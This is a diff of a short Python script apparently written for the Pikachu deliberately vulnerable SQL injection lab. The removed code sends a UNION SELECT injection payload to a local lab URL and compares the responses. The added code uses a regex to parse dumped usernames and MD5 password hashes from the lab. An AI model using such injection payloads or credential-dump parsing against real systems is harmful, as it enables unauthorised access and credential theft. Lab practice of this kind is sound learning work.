@@ -1,18 +1,11 @@
-import requests
-from bs4 import BeautifulSoup
-import difflib
-url1 = "http://192.168.232.128/pikachu/vul/sqli/sqli_str.php"
-url2 = "http://192.168.232.128/pikachu/vul/sqli/sqli_str.php?name=vince%27+union+select+1%2C2+%23&submit=%E6%9F%A5%E8%AF%A2"
+import re
 
-# 使用 soup.get_text() 获取纯文本内容
-response1 = requests.get(url1)
-soup1 = BeautifulSoup(response1.text, 'html.parser')
-content1 = set(soup1.get_text().splitlines())
+text = """username：1uid:admin email is: e10adc3949ba59abbe56e057f20f883eusername：1uid:pikachu email is: 670b14728ad9902aecba32e22fa4f6bdusername：1uid:test email is: e99a18c428cb38d5f260853678922e03"""
 
-response2 = requests.get(url2)
-soup2 = BeautifulSoup(response2.text, 'html.parser')
-content2 = set(soup2.get_text().splitlines())
+pattern = r'username：(.*?)uid:(.*?) email is: (.*?)(?=user|\Z)'
 
-# 找出 url2 有而 url1 没有的行并打印
-for line in content2 - content1:
-    print(line)
+# 使用 re.findall 进行匹配
+results = re.findall(pattern, text)
+
+# 打印匹配结果
+print(results)
